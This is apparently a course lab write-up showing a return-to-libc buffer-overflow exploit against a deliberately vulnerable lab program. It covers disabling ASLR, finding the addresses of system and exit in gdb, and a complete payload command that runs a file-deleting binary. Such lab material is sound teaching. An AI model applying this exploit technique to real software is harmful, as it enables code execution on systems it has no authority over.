# Exploit return-to-lib-c vulnerability, delete file "dummy" in directory /tmp/dummy using environment variable

Build image 
- `docker build -t img4lab .`
- `docker run -it --privileged -v C:/Users/Admin/seclabs:/home/seed/seclabs img4lab`

vuln.c
![Picture about vuln.c](/Chapter-2/imgs/Lab3/vuln.png)
- Compile `gcc vuln.c -o vuln.out -fno-stack-protector -mpreferred-stack-boundary=2`

Before doing this lab, we have to turn off ASLR (Address Space Layout Randomization) `sudo sysctl -w kernel.randomize_va_space=0`
![Picture about ASLR](/Chapter-2/imgs/Lab3/turn-off-random-address.png)

Now we create an environment variable in Linux with the path of file `file_del`
![Picture about creating env var](/Chapter-2/imgs/Lab3/create-env.png)
- `nasm -g -f elf file_del.asm`
- `ld -m elf_i386 -o file_del file_del.o`
- `pwd` -> `/home/seed/seclabs/bof`
- `export exploit_path="/home/seed/seclabs/bof/file_del`

Based on `env`, we know that we successfully create env var
![Picture about checking env var](/Chapter-2/imgs/Lab3/check-env.png)

Look at the stack frame
![Picture about stack frame](/Chapter-2/imgs/Lab3/Stack-Frame.png)

If we want to exploit
- 68 bytes to overwrite buf and ebp
- 4 bytes to overwrite ret addr of vuln with the address of system
- 4 bytes for the address of exit
- 4 bytes for argument of system (exploit path that we created before)

We use gdb to get address of them
- Start the program before finding
![Picture about finding address](/Chapter-2/imgs/Lab3/gdb-address.png)
- `0xf7e50db0` -> `\xb0\x0d\xe5\xf7`
- `0xf7e449e0` -> `\xe0\x49\xe4\xf7`
- `0xffffdf72` -> `\x72\xdf\xff\xff`

Therefore, the final command is `r $(python -c "print(68*'a' + '\xb0\x0d\xe5\xf7' + '\xe0\x49\xe4\xf7' + '\x72\xdf\xff\xff')")`

After running this command, we successfully execute `file_del` and delete `dummyfile`
![Picture about result](/Chapter-2/imgs/Lab3/result.png)